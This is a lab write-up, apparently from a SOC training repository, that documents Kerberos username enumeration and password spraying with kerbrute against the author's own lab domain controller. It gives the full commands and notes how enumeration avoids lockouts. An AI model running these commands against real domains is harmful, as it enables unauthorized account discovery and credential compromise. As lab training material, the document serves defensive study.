# T1087.002 – Kerberos User Enumeration & Password Spraying

| | |
|---|---|
| **Module** | Credential Access |
| **Technique** | Password Spraying - T1110.003 (sub-technique of T1110 Brute Force) — enumeration phase additionally maps to Account Discovery: Domain Account — T1087.002 |
| **Tactic** | Discovery ([TA0007](https://attack.mitre.org/tactics/TA0007/)) → Credential Access ([TA0006](https://attack.mitre.org/tactics/TA0006/)) |
| **Environment** | [`00-environment`](../../00-environment/) |


## Summary

I enumerated valid domain accounts against the soclab.local DC using kerbrute's Kerberos-based `userenum`, then fed the result into a password spray with kerbrute's `passwordspray` — first against a wrong password, then the actual lab password. This write-up covers the red team side only — detection notes for this chain are drafted separately and will land in a follow-up commit.

## Environment

| Role | Host | IP | Notes |
|---|---|---|---|
| Attacker | SOC-LIN-01 | 10.10.30.100 | kerbrute v1.0.3 |
| Target | SOC-DC01 | 10.10.10.200 | Domain Controller, `soclab.local`, Windows Server 2022 Build 20348 |

Full topology and network segmentation: [`00-environment`](../../00-environment/). AD account provisioning for this lab is covered there too, not repeated here.

## Setup

```bash
cd /opt
sudo wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O kerbrute
sudo chmod +x kerbrute
```



## Attack Execution

### Phase 1 — Username Enumeration

```bash
sudo ./kerbrute userenum -d soclab.local --dc 10.10.10.200 -o wyniki_enum.txt userlist.txt
```

kerbrute sends a TGT request (AS-REQ) per candidate username with no pre-authentication. A `PRINCIPAL UNKNOWN` response means the username doesn't exist; a prompt for pre-auth means it does — either way this never counts as a login failure, so it can't trigger a lockout.



### Phase 2 — Password Spraying

```bash
./kerbrute passwordspray -d soclab.local --dc 10.10.10.200 -v validusers.txt 'ZlyStrzal2025!'
```

```bash
./kerbrute passwordspray -d soclab.local --dc 10.10.10.200 -v validusers.txt 'L@bPass2026!'
```






Detection & IR write-up (Event IDs, Wazuh rule or built-in alert, triage → verdict → escalation) is in progress and will follow in a separate commit.

## References

- MITRE ATT&CK — [T1087.002 Account Discovery: Domain Account](https://attack.mitre.org/techniques/T1087/002/)
- MITRE ATT&CK — [T1110.003 Password Spraying](https://attack.mitre.org/techniques/T1110/003/)
- [kerbrute (GitHub)](https://github.com/ropnop/kerbrute)
